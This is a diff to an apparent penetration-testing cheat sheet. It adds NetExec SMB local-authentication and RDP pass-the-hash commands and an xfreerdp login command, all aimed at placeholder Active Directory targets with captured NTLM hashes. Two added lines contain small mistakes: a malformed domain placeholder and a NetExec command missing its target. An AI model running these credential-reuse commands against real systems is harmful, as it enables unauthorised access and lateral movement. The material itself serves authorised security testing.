@@ -316,6 +316,11 @@ How to pentest like a Gunnaj
   sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password>
   ```
 
+  #### Local authentication
+  ```shell
+  NetExec smb <target_IP> -u <AD_user> -H <hash[LM:NT]> --local-auth 
+  ```
+
   #### Pass-the-Hash
   ```shell
   sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -H <hash[LM:NT]> 
@@ -344,10 +349,17 @@ How to pentest like a Gunnaj
 </details> 
   
 <details>
-  <summary> NetExec local authentication </summary> 
-  
-  ```shell
-  NetExec smb <target_IP> -u <AD_user> -H <hash[LM:NT]> --local-auth 
+  <summary> RDP </summary> 
+
+  #### xfreerdp
+  ```shell 
+  xfreerdp /u:<AD_user> /d:Target_Domain>  /v:<target_IP>
+  NetExec smb  -u <AD_user> -H <hash[LM:NT]>
+  ```
+
+  #### NetExec
+  ```shell 
+   NetExec rdp <target_IP> -u <AD_user> -H <hash[LM:NT]>
   ```
 
 </details> 
